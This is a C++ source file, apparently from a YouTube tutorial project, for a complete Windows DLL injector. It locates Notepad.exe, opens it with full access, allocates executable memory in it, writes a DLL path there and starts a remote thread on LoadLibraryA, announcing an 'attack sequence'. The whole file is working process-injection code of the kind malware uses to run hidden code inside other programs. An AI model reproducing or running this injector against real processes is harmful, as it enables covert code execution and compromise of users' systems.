#include <iostream>
#include <tchar.h>
#include <wchar.h>
#include <Windows.h>
#include <TlHelp32.h>

#define DLL_PATH "D:\\Repos\\C++\\yt_tutorial_dll\\x64\\Debug\\yt_tutorial_dll.dll"     // check this if it doesn't work...
typedef int(__stdcall* f_funnyFunction)();

DWORD findProcessID();
#define TARGET_BINARY L"Notepad.exe"


int main()
{
	DWORD pid;
	HANDLE hProcess;
	LPVOID lpBaseAddress;
	size_t sz = strlen(DLL_PATH);
	int output_val = 0;


	std::cout << "Hello world, beginning attack sequence now!!\n";

	// get pid for target binary
	pid = findProcessID();

	// get handle to target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	// create memory in target process
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// write dll path to the target binary's memory
	output_val = WriteProcessMemory(hProcess, lpBaseAddress, DLL_PATH, sz, NULL);

	// get handle to kernel32.dll
	HMODULE hModule = GetModuleHandle(L"kernel32.dll");

	// get address of LoadLibraryA
	LPVOID lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");

	// create remote thread in target binary
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);

	if (hThread)
	{
		printf("Injection successful\n");
	}
	else
	{
		printf("Injection failed\n");
	}


}



DWORD findProcessID()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	do {
		if (!wcscmp(pe32.szExeFile, TARGET_BINARY))
		{
			return pe32.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	return 0;
}

